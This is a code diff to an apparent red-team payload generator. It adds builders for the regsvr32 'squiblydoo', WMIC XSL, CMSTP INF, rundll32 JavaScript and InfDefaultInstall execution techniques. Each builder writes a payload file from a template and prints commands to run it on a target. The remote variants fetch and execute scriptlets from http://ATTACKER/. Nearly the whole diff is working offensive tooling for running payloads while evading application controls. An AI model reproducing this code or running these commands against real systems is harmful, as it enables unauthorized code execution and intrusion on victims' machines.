@@ -757,6 +757,87 @@ def _compile_cs_strong(output_path, args):
         sys.exit(1)
 
 
+def build_regsvr32(args, assembly_args):
+    output_path = _build_vbs_family(
+        args, assembly_args,
+        template_file="regsvr32_payload.sct",
+        output_file="payload_ready.sct",
+    )
+    basename = os.path.basename(output_path)
+    print(f"[*] On target (local):", file=sys.stderr)
+    print(f"    regsvr32 /s /n /u /i:{basename} scrobj.dll", file=sys.stderr)
+    print(f"[*] On target (remote — host the .sct on your server):", file=sys.stderr)
+    print(f"    regsvr32 /s /n /u /i:http://ATTACKER/{basename} scrobj.dll", file=sys.stderr)
+
+
+def build_wmic(args, assembly_args):
+    output_path = _build_vbs_family(
+        args, assembly_args,
+        template_file="wmic_payload.xsl",
+        output_file="payload_ready.xsl",
+    )
+    basename = os.path.basename(output_path)
+    print(f"[*] On target (local):", file=sys.stderr)
+    print(f"    wmic os get /format:\"{basename}\"", file=sys.stderr)
+    print(f"[*] On target (remote — host the .xsl on your server):", file=sys.stderr)
+    print(f"    wmic os get /format:\"http://ATTACKER/{basename}\"", file=sys.stderr)
+
+
+def _build_sct_inf_pair(args, assembly_args, inf_template, inf_output, execution_cmd):
+    sct_path = _build_vbs_family(
+        args, assembly_args,
+        template_file="regsvr32_payload.sct",
+        output_file="payload_ready.sct",
+    )
+
+    inf_tpl_path = get_template_path(inf_template, None)
+    inf_content = load_template(inf_tpl_path)
+    inf_content = inf_content.replace("YOURSCTPATHHERE", os.path.basename(sct_path))
+
+    inf_dir = os.path.dirname(sct_path) or "."
+    inf_path = os.path.join(inf_dir, inf_output)
+    with open(inf_path, "w") as f:
+        f.write(inf_content)
+
+    print(f"[+] Written: {inf_path}", file=sys.stderr)
+    print(f"[*] On target (both files must be in same directory):", file=sys.stderr)
+    print(f"    {execution_cmd.format(inf=os.path.basename(inf_path))}", file=sys.stderr)
+    return sct_path, inf_path
+
+
+def build_cmstp(args, assembly_args):
+    _build_sct_inf_pair(
+        args, assembly_args,
+        inf_template="cmstp_payload.inf",
+        inf_output="payload_ready.inf",
+        execution_cmd="cmstp.exe /ni /s {inf}",
+    )
+
+
+def build_infdefaultinstall(args, assembly_args):
+    _build_sct_inf_pair(
+        args, assembly_args,
+        inf_template="infdefaultinstall_payload.inf",
+        inf_output="payload_ready.inf",
+        execution_cmd="InfDefaultInstall.exe {inf}",
+    )
+
+
+def build_rundll32(args, assembly_args):
+    output_path = _build_vbs_family(
+        args, assembly_args,
+        template_file="regsvr32_payload.sct",
+        output_file="payload_ready.sct",
+    )
+    basename = os.path.basename(output_path)
+    print(f"[*] On target (local — use full path to .sct):", file=sys.stderr)
+    print(f'    rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication '
+          f'";GetObject("script:C:\\\\path\\\\{basename}")', file=sys.stderr)
+    print(f"[*] On target (remote — host the .sct on your server):", file=sys.stderr)
+    print(f'    rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication '
+          f'";GetObject("script:http://ATTACKER/{basename}")', file=sys.stderr)
+
+
 PAYLOAD_BUILDERS = {
     "msbuild": build_msbuild,
     "installutil": build_installutil,
@@ -769,6 +850,11 @@ PAYLOAD_BUILDERS = {
     "hta": build_hta,
     "vba": build_vba,
     "shellcode": build_shellcode,
+    "regsvr32": build_regsvr32,
+    "wmic": build_wmic,
+    "cmstp": build_cmstp,
+    "rundll32": build_rundll32,
+    "infdefaultinstall": build_infdefaultinstall,
 }
 
 PAYLOAD_DESCRIPTIONS = {
@@ -783,4 +869,9 @@ PAYLOAD_DESCRIPTIONS = {
     "hta": "HTA application (.hta) — mshta execution, browser context",
     "vba": "VBA macro (.bas) — Excel/Word Auto_Open, CLR via COM",
     "shellcode": "VBA shellcode runner (.bas) — raw shellcode, no CLR needed",
+    "regsvr32": "Regsvr32 scriptlet (.sct) — squiblydoo, local or remote execution",
+    "wmic": "WMIC XSL transform (.xsl) — embedded VBScript, local or remote",
+    "cmstp": "CMSTP profile installer (.inf + .sct) — scriptlet via INF",
+    "rundll32": "Rundll32 scriptlet (.sct) — JavaScript + GetObject execution",
+    "infdefaultinstall": "InfDefaultInstall (.inf + .sct) — lesser-known INF handler",
 }
